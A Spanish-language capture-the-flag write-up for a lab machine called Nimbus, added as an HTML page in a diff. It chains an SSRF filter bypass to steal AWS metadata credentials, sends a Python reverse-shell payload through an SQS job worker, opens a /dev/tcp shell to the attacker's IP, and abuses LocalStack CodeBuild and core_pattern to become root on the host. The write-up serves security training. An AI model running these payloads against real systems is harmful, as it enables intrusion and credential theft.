+                    LocalStack.</p>
+
+                <h2>SSRF - Bypasseando el Filtro de IMDS</h2>
+                <p>Ciertamente, si intento apuntar a la URL de IMDS me bloquea:</p>
+                <p><img src="./media/image1.png"
+                        alt="Respuesta bloqueada al intentar alcanzar directamente la URL de metadatos IMDS" /></p>
+
+                <p>También acabo las URL con el query parameter <code>?.yaml</code> para pasar este filtro:</p>
+                <p><img src="./media/image6.png"
+                        alt="URL con el query parameter ?.yaml añadido para bypassear el filtrado" /></p>
+
+                <p>El simple truco de transformar una IPv4 a decimal (<a
+                        href="https://www.ipaddressguide.com/ip">ipaddressguide.com/ip</a>) funciona para bypassear este
+                    bloqueo que aplican:</p>
+                <pre><code class="language-plaintext">169.254.169.254  ->  2852039166</code></pre>
+
+                <p>A partir de esta URL:</p>
+                <pre><code class="language-plaintext">http://2852039166/latest/meta-data/?.yaml</code></pre>
+
+                <p>Se puede ver la estructura del servicio de IMDS, que es como navegar carpetas:</p>
+                <p><img src="./media/image2.png"
+                        alt="Estructura de directorios de metadatos IMDS navegada a través de SSRF" /></p>
+
+                <h2>Extrayendo Credenciales del Rol desde IMDS</h2>
+                <p>Dentro de esta ruta se pueden encontrar credenciales de un rol de AWS:</p>
+                <pre><code class="language-plaintext">http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?.yaml</code></pre>
+                <p><img src="./media/image7.png"
+                        alt="Respuesta JSON conteniendo credenciales temporales del rol AWS" /></p>
+
+                <pre><code class="language-json">{
+  "Code": "Success",
+  "LastUpdated": "...",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
+  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
+  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJ...",
+  "Expiration": "..."
+}</code></pre>
+
+                <p>Como se puede apreciar, el token comienza con <code>ASIA</code> y el mismo nombre de la credencial
+                    indica que es un rol; por lo tanto este token es necesario para autenticarse, a diferencia de las
+                    credenciales normales de usuario de IAM que comienzan con <code>AKIA</code> y no necesitan este
+                    token.</p>
+
+                <p>También encuentro esta información bajo:</p>
+                <pre><code class="language-plaintext">http://2852039166/latest/meta-data/iam/info?.yaml
+
+InstanceProfileArn  arn:aws:iam::847219365028:instance-profile/nimbus-web-profile
+InstanceProfileId   AIPAQX4PG7L2K9M3N5R8K</code></pre>
+
+                <p>Esto es el perfil que tiene aplicado la EC2 y su id; también se puede observar la ID de la cuenta.</p>
+
+                <p>En <code>http://2852039166/latest/meta-data/hostname?.yaml</code> encuentro la IP interna de la EC2:
+                </p>
+                <pre><code class="language-plaintext">ip-10-0-1-42.ec2.internal</code></pre>
+
+                <p>En <code>http://2852039166/latest/meta-data/placement/region?.yaml</code> veo que la región que usan
+                    es <code>us-east-1</code>. Pero bueno, realmente lo importante aquí son las credenciales del rol y
+                    quizá las del perfil.</p>
+
+                <h2>Configurando el Acceso a AWS</h2>
+                <p>Hago un perfil bajo <code>~/.aws/credentials</code>:</p>
+                <pre><code class="language-ini">[nimbus]
+endpoint_url = http://aws.nimbus.htb
+region = us-east-1
+aws_access_key_id = ASIAQX4PG7L2K9M3N5R8
+aws_secret_access_key = bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs
+aws_session_token = IQoJb3JpZ(...)</code></pre>
+
+                <p>Y lo exporto para tenerlo por defecto:</p>
+                <pre><code class="language-bash">export AWS_PROFILE=nimbus</code></pre>
+
+                <p>Confirmo el acceso:</p>
+                <pre><code class="language-bash">aws sts get-caller-identity --profile nimbus</code></pre>
+                <pre><code class="language-json">{
+  "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
+  "Account": "847219365028",
+  "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
+}</code></pre>
+
+                <p>Parece que los permisos están al menos un poco cerrados:</p>
+                <pre><code class="language-bash">aws s3 ls --profile nimbus
+An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: s3:ListAllMyBuckets on resource: *</code></pre>
+
+                <h2>Enumerando Servicios AWS Accesibles</h2>
+                <p>Pruebo algunas cosas más pero no parece que los servicios típicos sean accesibles, así que voy a usar
+                    esta herramienta que automatiza un barrido de llamadas y avisa si algo interesante puede estar
+                    abierto: <a href="https://github.com/andresriancho/enumerate-iam">enumerate-iam</a>.</p>
+
+                <p>Al lanzarlo veo esto:</p>
+                <pre><code class="language-plaintext">[INFO] -- sqs.list_queues() worked!</code></pre>
+
+                <p>Esto encaja con la mecánica de jobs descrita en la web. Pero creo que la información no es del todo
+                    completa, así que voy a usar una herramienta bastante más completa: <a
+                        href="https://github.com/BishopFox/cloudfox">CloudFox</a>.</p>
+
+                <p>La lanzo con el comando:</p>
+                <pre><code class="language-bash">AWS_ENDPOINT_URL=http://aws.nimbus.htb cloudfox aws --profile nimbus all-checks</code></pre>
+
+                <p>Y produce un inventario de AWS con los recursos a los que puede acceder:</p>
+                <pre><code class="language-json">[
+  { "Resource Type": "Total",      "us-east-1": "1" },
+  { "Resource Type": "SQS Queues", "us-east-1": "1" }
+]</code></pre>
+
+                <p>Y unos comandos que puedo probar:</p>
+                <pre><code class="language-bash"># ------------------
+# Queue: nimbus-jobs
+# ------------------
+# Receive a message from the queue
+aws --profile $profile --region us-east-1 sqs receive-message --queue-url http://floci:4566/847219365028/nimbus-jobs --attribute-names All --message-attribute-names All --max-number-of-messages 5 --visibility-timeout 0
+
+# Send a message to the queue without attributes file
+aws --profile $profile --region us-east-1 sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body "[INSERT MESSAGE BODY]"
+
+# Send message to the queue with attributes file (You'll have to create and populate the file)
+aws --profile $profile --region us-east-1 sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body "[INSERT MESSAGE BODY] --message-attributes file://./file.json"</code></pre>
+
+                <pre><code class="language-bash">aws sqs list-queues
+{
+  "QueueUrls": [
+    "http://floci:4566/847219365028/nimbus-jobs"
+  ]
+}</code></pre>
+
+                <p>Puedo volver a usar el SSRF para alcanzar este endpoint pero de primeras me para el filtro. Haciendo
+                    algunas pruebas veo que bloquea <code>floci</code>, ya que la misma URL con la IP de mi máquina no la
+                    bloquea.</p>
+
+                <p>Pero también puedo seguir interaccionando con AWS con esta URL. Pruebo los comandos que me ha dicho
+                    CloudFox:</p>
+                <pre><code class="language-bash">aws sqs get-queue-attributes
+aws sqs send-message</code></pre>
+
+                <p>El hecho de poder enviar mensajes parece interesante, quizá pueda influenciar acciones de alguna
+                    manera.</p>
+
+                <p>En la web veo que si envío un YAML mediante la web (no por URL), devuelve este mensaje:</p>
+                <p><img src="./media/image4.png"
+                        alt="Respuesta web tras enviar un job YAML a través de la interfaz" /></p>
+
+                <p>Pero no parece que me dé información que no sepa ya.</p>
+
+                <h2>SSRF - Barrido de Puertos Internos</h2>
+                <p>Con el mismo truco de usar la IPv4 en decimal puedo acceder a <code>127.0.0.1</code> (localhost). Me
+                    hago un script rápido para hacer un barrido de puertos internos:</p>
+                <pre><code class="language-bash">scan_port() {
+  i=$1
+  response=$(curl -s -m 2 -X POST --data-binary "url=http://2130706433:${i}?.yaml" http://nimbus.htb/jobs/preview)
+  if ! echo "$response" | grep -q "Could not fetch"; then
+    echo "[+] Port $i: $response" | tee -a results.txt
+  fi
+}
+export -f scan_port
+seq 1 65535 | xargs -P 50 -I{} bash -c 'scan_port "$@"' _ {}</code></pre>
+
+                <p>Hay bastantes puertos que responden:</p>
+                <pre><code class="language-plaintext">80     -> web
+5000   -> web (probablemente para el reverse proxy)
+9090   -> localstack/floci
+14566  -> Esta respuesta es interesante, devuelve un XML
+16733, 16743, 16741, 16739, 52645, 52646 -> probablemente puertos efímeros o de servicios internos, la respuesta es vacía
+33265  -> Otra vez la web</code></pre>
+
+                <p>El XML del puerto 14566 devuelve el nombre de un bucket, <code>nimbus-dev-artifacts</code>:</p>
+                <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;ListAllMyBucketsResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"&gt;
+  &lt;Owner&gt;&lt;ID&gt;owner&lt;/ID&gt;&lt;DisplayName&gt;owner&lt;/DisplayName&gt;&lt;/Owner&gt;
+  &lt;Buckets&gt;
+    &lt;Bucket&gt;
+      &lt;Name&gt;nimbus-dev-artifacts&lt;/Name&gt;
+      &lt;CreationDate&gt;2026-06-23T21:28:48.292192121Z&lt;/CreationDate&gt;
+    &lt;/Bucket&gt;
+  &lt;/Buckets&gt;
+&lt;/ListAllMyBucketsResult&gt;</code></pre>
+
+                <p>No puedo listar el bucket con las credenciales que tengo pero puedo seguir llamando a este puerto con
+                    el nombre del bucket:</p>
+                <pre><code class="language-plaintext">http://2130706433:14566/nimbus-dev-artifacts?.yaml</code></pre>
+                <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"&gt;
+  &lt;Name&gt;nimbus-dev-artifacts&lt;/Name&gt;
+  &lt;Prefix&gt;&lt;/Prefix&gt;&lt;MaxKeys&gt;1000&lt;/MaxKeys&gt;&lt;IsTruncated&gt;false&lt;/IsTruncated&gt;
+  &lt;Contents&gt;
+    &lt;Key&gt;source/worker.py&lt;/Key&gt;
+    &lt;LastModified&gt;2026-06-23T21:28:49Z&lt;/LastModified&gt;
+    &lt;ETag&gt;&amp;quot;47109e759cbf87fd1c47d3a5097582ee&amp;quot;&lt;/ETag&gt;
+    &lt;Size&gt;1755&lt;/Size&gt;&lt;StorageClass&gt;STANDARD&lt;/StorageClass&gt;
+  &lt;/Contents&gt;
+&lt;/ListBucketResult&gt;</code></pre>
+
+                <p>Y en esta ruta que se ve en este último XML consigo el contenido del worker:</p>
+                <pre><code class="language-plaintext">http://2130706433:14566/nimbus-dev-artifacts/source/worker.py?.yaml</code></pre>
+
+                <h2>Analizando el Worker</h2>
+                <pre><code class="language-python">"""Nimbus job worker"""
+import os, time, subprocess, boto3, yaml
+
+ENDPOINT  = os.environ.get("AWS_ENDPOINT_URL", "http://aws.nimbus.htb")
+QUEUE_URL = os.environ.get("QUEUE_URL", "http://aws.nimbus.htb/847219365028/nimbus-jobs")
+REGION    = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
+POLL_SECS = 5
+
+print(f"[worker] starting; endpoint={ENDPOINT} queue={QUEUE_URL}", flush=True)
+sqs = boto3.client("sqs", endpoint_url=ENDPOINT, region_name=REGION)
+
+def handle_message(body):
+    print(f"[worker] received message ({len(body)} bytes)", flush=True)
+    job = yaml.load(body, Loader=yaml.Loader)
+    if not isinstance(job, dict):
+        print("[worker] message did not parse to a dict, skipping", flush=True)
+        return
+    name = job.get("name", "&lt;unnamed&gt;")
+    script = job.get("script", "")
+    print(f"[worker] running job '{name}'", flush=True)
+    if script:
+        result = subprocess.run(["python3", "-c", script],
+                                capture_output=True, text=True, timeout=30)
+        print(f"[worker] stdout: {result.stdout}", flush=True)
+        if result.stderr: print(f"[worker] stderr: {result.stderr}", flush=True)
+
+def main():
+    while True:
+        try:
+            resp = sqs.receive_message(QueueUrl=QUEUE_URL,
+                                       MaxNumberOfMessages=1, WaitTimeSeconds=POLL_SECS)
+            for m in resp.get("Messages", []):
+                try: handle_message(m["Body"])
+                except Exception as e: print(f"[worker] error: {e}", flush=True)
+                finally:
+                    sqs.delete_message(QueueUrl=QUEUE_URL, ReceiptHandle=m["ReceiptHandle"])
+        except Exception as e:
+            print(f"[worker] poll error: {e}", flush=True)
+        time.sleep(POLL_SECS)
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+                <p>Aquí es especialmente interesante que el worker puede recibir un campo <code>script</code> y
+                    ejecutarlo con python directamente.</p>
+
+                <h2>Acceso Inicial - RCE mediante el Worker de SQS</h2>
+                <p>Para conseguir RCE me pongo en escucha por el puerto 443 con netcat y envío este mensaje a la cola de
+                    SQS:</p>
+                <pre><code class="language-bash">aws sqs send-message \
+  --queue-url "http://aws.nimbus.htb/847219365028/nimbus-jobs" \
+  --message-body $'name: pwn\nscript: "import os,pty,socket;s=socket.socket();s.connect((\'10.10.14.147\',443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\'/bin/bash\')"'
+
+{
+  "MD5OfMessageBody": "8c755b55dbacf1aedd80d64d44ef46e8",
+  "MessageId": "6bb4efc4-f23c-45c4-a3a5-f7a383daa974"
+}</code></pre>
+
+                <p>Recibo una reverse shell como el usuario <code>worker</code> en un contenedor.</p>
+
+                <p>También es un problema el hecho de que el script tiene un timeout de 30 segundos, lo que hace que esta
+                    reverse shell solo aguante estos 30 segundos. Para mitigar esto me pongo en escucha por el puerto
+                    4445, por ejemplo, y me envío una reverse shell con un proceso independiente con el comando
+                    <code>setsid</code>:</p>
+                <pre><code class="language-bash">setsid bash -i &gt;&amp; /dev/tcp/10.10.14.147/4445 0&gt;&amp;1 &amp;</code></pre>
+
+                <p>También es posible hacer esto con el comando <code>nohup</code> como he visto en otras máquinas pero
+                    me quedaba la shell colgada con ese. Con esta shell independiente consigo acceso sin problema.</p>
+
+                <h2>Enumeración del Contenedor</h2>
+                <p>Con el comando <code>env</code> veo una access key y su secreto que no conocía:</p>
+                <pre><code class="language-plaintext">AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
+AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN</code></pre>
+
+                <p>Repito el proceso de usar CloudFox para ver si hay algo más accesible con estas nuevas credenciales
+                    pero no obtengo más resultados ni privilegios que lo que ya conseguí con el rol.</p>
+
+                <p>Investigo la máquina manualmente y con linpeas para ver si es posible un escape del container con
+                    algunas de las vulnerabilidades del kernel de Linux que han salido últimamente (copy_file_range,
+                    DirtyPipe, etc.) pero no parece que sea posible, la imagen parece hardened.</p>
+
+                <h2>Mapeo de la Red Interna</h2>
+                <p>Me paso un binario de nmap al contenedor para mapear mejor la red y encuentro esto:</p>
+                <pre><code class="language-plaintext">worker@c513b14aaeef:~$ ./nmap -p- --min-rate 10000 172.17.0.1
+Nmap scan report for 172.17.0.1
+Host is up (0.0012s latency).
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+worker@c513b14aaeef:~$ ./nmap -p- --min-rate 10000 172.18.0.1-3
+Nmap scan report for nimbus.htb (172.18.0.1)
+Host is up (0.0074s latency).
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for nimbus-floci.nimbus-net (172.18.0.2)
+Host is up (0.00084s latency).
+PORT     STATE SERVICE
+4566/tcp open  unknown
+9169/tcp open  unknown
+
+Nmap scan report for c513b14aaeef (172.18.0.3)
+Host is up (0.0022s latency).
+All 65535 scanned ports on c513b14aaeef (172.18.0.3) are closed</code></pre>
+
+                <pre><code class="language-bash">worker@c513b14aaeef:~$ aws sts get-caller-identity --endpoint-url=http://172.18.0.2:4566
+{
+  "UserId": "847219365028",
+  "Account": "847219365028",
+  "Arn": "arn:aws:iam::847219365028:root"
+}</code></pre>
+
+                <p>Es interesante que sea root por el puerto 4566 de la IP <code>172.18.0.2</code> que es igual que
+                    <code>floci:4566</code>, el endpoint que devolvía los datos del bucket con el código del worker y
+                    también igual que la URL de la queue de SQS. Además el puerto 4566 es el puerto por defecto de
+                    LocalStack.</p>
+
+                <h2>Escalada de Privilegios - Abuso de CodeBuild en LocalStack</h2>
+                <p>Teniendo esta información, una buena manera de escalar privilegios puede ser con AWS CodeBuild, usando
+                    las credenciales por defecto que usa LocalStack, <code>test:test</code>. Compruebo que puedo acceder
+                    a este servicio:</p>
+                <pre><code class="language-python">&gt;&gt;&gt; import boto3, json
+&gt;&gt;&gt; cb = boto3.client('codebuild', endpoint_url='http://172.18.0.2:4566',
+...     aws_access_key_id='test', aws_secret_access_key='test', region_name='us-east-1')
+&gt;&gt;&gt; projects = cb.list_projects()
+&gt;&gt;&gt; print(projects)
+{'projects': [], ...}</code></pre>
+
+                <p>No hay proyectos creados, pero esto da igual, ya que la meta aquí es crear uno yo mismo con unos
+                    parámetros concretos para conseguir RCE en el host.</p>
+
+                <p>Para hacer esto trabajo con IA para conseguir una primera build que funciona, usando la imagen por
+                    defecto <code>floci/floci:latest</code>:</p>
+                <pre><code class="language-python">import boto3, time
+
+ENDPOINT = 'http://172.18.0.2:4566'
+cb = boto3.client('codebuild',
+    endpoint_url=ENDPOINT,
+    aws_access_key_id='test',
+    aws_secret_access_key='test',
+    region_name='us-east-1'
+)
+
+try:
+    cb.create_project(
+        name='nimbus-poc',
+        source={'type': 'NO_SOURCE'},
+        artifacts={'type': 'NO_ARTIFACTS'},
+        environment={
+            'type': 'LINUX_CONTAINER',
+            'computeType': 'BUILD_GENERAL1_SMALL',
+            'image': 'floci/floci:latest',
+            'privilegedMode': True,
+        },
+        serviceRole='arn:aws:iam::000000000000:role/codebuild-role',
+    )
+    print("Proyecto creado")
+except Exception as e:
+    print("Error:", e)
+
+buildspec = """version: 0.2
+phases:
+  build:
+    commands:
+      - id
+      - ls /proc/1/root/root/
+      - cat /proc/1/root/root/root.txt
+"""
+
+resp = cb.start_build(projectName='nimbus-poc', buildspecOverride=buildspec)
+build_id = resp['build']['id']
+print("Build ID:", build_id)
+
+for _ in range(40):
+    time.sleep(3)
+    status = cb.batch_get_builds(ids=[build_id])['builds'][0]
+    print(f"  {status['buildStatus']} / {status['currentPhase']}")
+    if status['buildStatus'] != 'IN_PROGRESS':
+        break
+
+logs = boto3.client('logs',
+    endpoint_url=ENDPOINT,
+    aws_access_key_id='test',
+    aws_secret_access_key='test',
+    region_name='us-east-1'
+)
+events = logs.get_log_events(
+    logGroupName=status['logs']['groupName'],
+    logStreamName=status['logs']['streamName'],
+)
+for e in events['events']:
+    print(e['message'])</code></pre>
+
+                <p>Es importante en especial esta línea:</p>
+                <pre><code class="language-python">'privilegedMode': True,</code></pre>
+
+                <p>Que asignará el permiso <code>CAP_SYS_ADMIN</code> al contenedor y me permitirá abusar de
+                    <code>core_pattern</code> más adelante para escapar de este contenedor que creo mediante las builds.
+                </p>
+
+                <p>Pero falla con este error:</p>
+                <pre><code class="language-plaintext">Build ID: nimbus-poc:1
+FAILED / COMPLETED
+mkdir: cannot create directory '/codebuild': Permission denied</code></pre>
+
+                <p>Ya que el runner del contenedor intenta crear el directorio <code>codebuild</code> pero no tiene
+                    permisos para crear este directorio en la raíz del sistema del contenedor.</p>
+
+                <h2>Consiguiendo Root mediante Abuso de core_pattern</h2>
+                <p>Para poder acceder al host más adelante necesito privilegios elevados de root, así que para
+                    solucionar esto voy a hacer un override de variables de entorno mediante
+                    <code>BASH_FUNC_mkdir%%</code> en la próxima build. Esto hará que al construirse el contenedor y
+                    cuando use el comando <code>mkdir</code> con privilegios elevados, el comando <code>mkdir</code> lo
+                    cambiaré por el comando o comandos que yo defina, así consiguiendo RCE como root en el contenedor:
+                </p>
+
+                <pre><code class="language-python">import boto3
+
+ENDPOINT = 'http://172.18.0.2:4566'
+PROJECT = 'nimbus-deploy'
+
+cb = boto3.client('codebuild',
+    region_name='us-east-1',
+    endpoint_url=ENDPOINT,
+    aws_access_key_id='test',
+    aws_secret_access_key='test',
+)
+
+buildspec = r"""version: 0.2
+phases:
+  build:
+    commands:
+      - UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1) || true
+      - printf '#!/bin/sh\necho ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILnsFLLgBuhGAkDdmNK86OBVaDN8Aqyy+l6EpQuz8uBJ asd@asd.com > /root/.ssh/authorized_keys\n' > /exploit_root.sh || true
+      - chmod +x /exploit_root.sh || true
+      - echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern || true
+      - ulimit -c unlimited || true
+      - bash -c 'kill -11 $$' || true
+"""
+
+try:
+    cb.create_project(
+        name=PROJECT,
+        source={'type': 'NO_SOURCE'},
+        artifacts={'type': 'NO_ARTIFACTS'},
+        environment={
+            'type': 'LINUX_CONTAINER',
+            'computeType': 'BUILD_GENERAL1_SMALL',
+            'image': 'floci/floci:latest',
+            'privilegedMode': True,
+            'environmentVariables': [],
+        },
+        serviceRole='arn:aws:iam::000000000000:role/codebuild-role',
+    )
+    print("Proyecto creado")
+except Exception as e:
+    print("Ya existe:", e)
+
+resp = cb.start_build(
+    projectName=PROJECT,
+    environmentVariablesOverride=[
+        {'name': 'BASH_FUNC_id%%', 'value': '() { echo uid=1000; }', 'type': 'PLAINTEXT'}
+    ],
+    buildspecOverride=buildspec,
+)
+print("Build:", resp['build']['id'])</code></pre>
+
+                <p>En esta build final lo que hago es crear el proyecto <code>nimbus-deploy</code> si no existe y luego
+                    creo una build que ejecuta los siguientes comandos:</p>
+                <ol>
+                    <li>Con el comando <code>mountinfo</code> consigo la ruta en el host donde se escriben los cambios
+                        del contenedor, es la ruta en el sistema donde vive el nuevo contenedor que genero.</li>
+                    <li>Creo un payload que es un script shell dentro del contenedor que escribe mi clave pública en la
+                        ruta <code>/root/.ssh/authorized_keys</code> del host.</li>
+                    <li>Escribo la ruta de donde vive el script que he creado en
+                        <code>/proc/sys/kernel/core_pattern</code>, esto le dice al kernel qué hacer cuando un proceso
+                        crashea (al tener el privilegio <code>CAP_SYS_ADMIN</code> puedo escribir en este archivo).
+                        Entonces cuando crashee un proceso ejecutará mi script en el host, ¡como root!</li>
+                    <li>Habilito los core dumps en el proceso actual.</li>
+                    <li>Provoco el crash (SIGSEGV), lo que desencadena la cadena que he construido con mi payload.</li>
+                </ol>
+
+                <p>Cuando todo esto ocurre, el resultado final es que mi clave pública queda escrita en
+                    <code>/root/.ssh/authorized_keys</code> en el host, y ahora puedo entrar mediante SSH como root y
+                    consigo la flag del sistema:</p>
+                <pre><code class="language-bash">root@nimbus:~# whoami
+root</code></pre>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
